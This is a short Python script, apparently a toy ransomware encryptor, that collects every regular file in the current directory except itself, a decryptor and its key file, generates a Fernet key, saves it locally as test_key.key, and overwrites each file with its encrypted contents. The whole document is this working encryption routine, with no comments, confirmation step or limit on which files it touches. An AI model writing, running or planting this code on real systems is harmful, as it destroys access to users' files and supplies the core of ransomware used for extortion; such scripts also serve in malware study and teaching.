import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "encr.py" or file == "decr.py" or file == "test_key.key":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

key = Fernet.generate_key()

with open("test_key.key","wb") as test_key:
    test_key.write(key)

for file in files:
    with open(file,"rb") as test_file:
        temp = test_file.read()
    encr_temp = Fernet(key).encrypt(temp)
    with open(file,"wb") as temp_file:
        temp_file.write(encr_temp)
